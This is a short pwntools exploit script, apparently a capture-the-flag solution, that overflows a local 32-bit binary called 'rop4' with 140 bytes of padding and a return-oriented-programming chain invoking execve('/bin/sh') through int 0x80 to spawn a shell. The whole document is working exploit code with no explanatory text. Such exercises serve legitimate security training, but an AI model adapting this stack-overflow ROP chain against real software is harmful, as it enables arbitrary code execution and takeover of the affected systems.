from pwn import *

context(os='linux', arch='i386')
context.log_level='debug'

p = process('./rop4')

bin_sh_addr = 0x80cbf4f
pop_edi = 0x08049611
pop_eax = 0x080c28c6
pop_ebx = 0x080481ec
pop_ecx = 0x080e3c2a
pop_edx = 0x080551ca
syscall = 0x08051e6d
int_80 = 0x08049449
addr = 0x080eef99
ret = 0x080481cb

payload = 'a'*140

payload += p32(pop_ebx)
payload += p32(bin_sh_addr)
payload += p32(pop_ecx)
payload += p32(0x0)
payload += p32(pop_edx)
payload += p32(0x0)
payload += p32(pop_eax)
payload += p32(0xb)
payload += p32(int_80)

gdb.attach(p)

p.sendline(payload)



p.interactive()
